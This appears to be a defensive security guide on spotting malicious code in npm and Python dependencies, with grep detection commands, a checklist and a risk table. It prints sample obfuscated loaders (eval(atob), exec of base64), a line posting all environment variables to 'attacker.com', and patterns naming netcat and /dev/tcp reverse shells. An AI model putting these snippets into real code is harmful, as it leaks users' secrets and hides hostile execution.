# Malicious Code Detection

## Supply Chain Attack Indicators

### Typosquatting Detection
Check package names against known legit packages:
```bash
# Common npm typosquats pattern: extra/missing letters, swapped chars
# Examples: lodahs vs lodash, reqeust vs request, djnago vs django

# Check all installed packages
cat package.json | jq '.dependencies, .devDependencies | keys[]'
# Manually compare against known good names

# Automated: pip-audit / safety flag some typosquats
pip-audit -r requirements.txt
```

### Postinstall / Lifecycle Script Abuse (npm)
```bash
# Check for suspicious postinstall scripts
cat package.json | jq '.scripts'
# Red flags: network calls, base64 decoding, eval, curl/wget in scripts

# Check all dependencies' package.json scripts
find node_modules -name "package.json" -maxdepth 3 | \
  xargs grep -l "postinstall\|preinstall\|install" | head -20
```

### Dependency Confusion Attacks
```bash
# Check if internal package names could be hijacked on public registries
# Look for packages with org names / internal prefixes
cat package.json | jq '.dependencies' | grep "@company\|internal\|private"

# Verify registry source in .npmrc
cat .npmrc
cat ~/.npmrc
```

## Obfuscation Patterns

### JavaScript Deobfuscation
```javascript
// Base64 encoded payloads
atob("SGVsbG8=")
Buffer.from("SGVsbG8=", "base64").toString()

// Hex encoding
"\x48\x65\x6c\x6c\x6f"

// charCode arrays
String.fromCharCode(72, 101, 108, 108, 111)

// eval(atob(...)) pattern — always suspicious
eval(atob("dmFyIHg9Li4u"))

// Obfuscated property access
window["e"+"val"](...)
this["con"+"sole"]["lo"+"g"](...)
```

Detection:
```bash
# Find eval with encoded strings
grep -rn "eval\s*(atob\|eval\s*(Buffer\|eval\s*(String.from" . --include="*.js"

# Find long base64-like strings
grep -rn '"[A-Za-z0-9+/]\{100,\}=*"' . --include="*.js"

# Obfuscated obfuscated JS
grep -rn 'String\.fromCharCode\|\\x[0-9a-f][0-9a-f]\\x' . --include="*.js"
```

### Python Obfuscation
```python
# exec + base64
exec(__import__('base64').b64decode('aW1wb3J0IG9z...'))

# compile + exec
exec(compile(base64.b64decode(code), '<string>', 'exec'))

# Bytecode only (.pyc without .py source)
```

Detection:
```bash
grep -rn "__import__\s*(" . --include="*.py" | grep -v "^#"
grep -rn "exec\s*(\s*__import__\|exec\s*(\s*compile\|exec\s*(\s*base64" . --include="*.py"
find . -name "*.pyc" ! -name "*.py" -print  # bytecode without source
```

## Backdoor Patterns

### Network Beaconing
```bash
# Unexpected outbound connections in library code
grep -rn "requests.get\|fetch\|http.get\|urllib.request\|curl\|wget" \
  node_modules/ vendor/ --include="*.{js,py}" | grep -v "localhost\|127.0.0.1"

# DNS exfiltration patterns
grep -rn "dns.resolve\|socket.getaddrinfo\|nslookup" . --include="*.{js,py,rb}"
```

### Reverse Shell Indicators
```bash
# Common reverse shell patterns
grep -rn "socket\|bind\|connect\|SOCK_STREAM" . --include="*.py" | \
  grep -v test | grep -v "# "

grep -rn "nc -e\|/bin/bash.*socket\|bash.*>&.*dev/tcp" .
```

### Environment/Secret Exfiltration
```python
# Sends all env vars to remote
import os, requests
requests.post("https://attacker.com", data=dict(os.environ))

# Common pattern: reads env, posts to external URL
```
```bash
grep -rn "os\.environ\|process\.env" . | grep -i "post\|send\|upload\|request"
```

## Dependency Audit Checklist

- [ ] All package names verified against intended packages (no typosquats)
- [ ] No unexpected postinstall/preinstall scripts with network activity
- [ ] No dependencies pulling in packages not listed in direct deps
- [ ] Internal package names not leaked to public registries
- [ ] Lockfile committed and matches manifest
- [ ] No packages with 0 or 1 maintainer for critical dependencies
- [ ] Publication dates match expected release history (no sudden old version updates)
- [ ] GitHub/source URL matches in package metadata

## Red Flag Summary

| Indicator | Risk |
|---|---|
| `eval(atob(...))` in any installed package | Critical |
| postinstall with curl/wget/base64 | Critical |
| Package beacons to external IP at startup | Critical |
| Long hex/base64 strings in source | High |
| Package name 1-2 chars off from popular lib | High |
| `.pyc` files without `.py` source | High |
| `os.environ` data sent to external URL | Critical |
| Unexpected `socket` + `connect` in library | High |
| `__import__` called with string variable | High |
| Package published hours before being depended on | Medium |
